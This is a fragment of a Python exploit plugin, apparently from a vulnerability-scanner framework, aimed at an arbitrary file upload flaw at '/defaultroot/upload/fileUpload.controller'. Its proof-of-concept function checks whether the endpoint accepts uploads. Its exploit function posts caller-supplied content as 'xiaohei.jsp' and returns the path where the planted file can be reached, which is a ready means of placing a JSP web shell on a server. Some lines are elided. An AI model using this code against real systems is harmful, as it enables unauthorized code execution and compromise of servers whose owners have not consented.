...
def vuln_info():
    info={
        'vuln_name': 'fileUpload.controller任意文件上传',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        url = url + '/defaultroot/upload/fileUpload.controller'
        status = requests.post(url,headers=heads,files=files,verify=False)
        if "\"fileSize\"" in status.text and status.status_code == 200:
            result['Result'] = True
            result['Result_Info']= "/defaultroot/upload/fileUpload.controller"
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='uploadfile':
            files = {
                "file": ("xiaohei.jsp", exp_data['filename_contents']),
            }
            resultUploadPath = url
            url = url + '/defaultroot/upload/fileUpload.controller'
            status = requests.post(url,headers=heads,files=files,verify=False)
            print(exp_data)
            if "success" in status.text and status.status_code == 200:
                path = getmidstring(status.text,"data\":\"","\"")
                result['Result'] = True
                result['Result_Info'] = '上传成功\n上传路径为:'+resultUploadPath +'defaultroot/upload/html/'+path+';xh'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
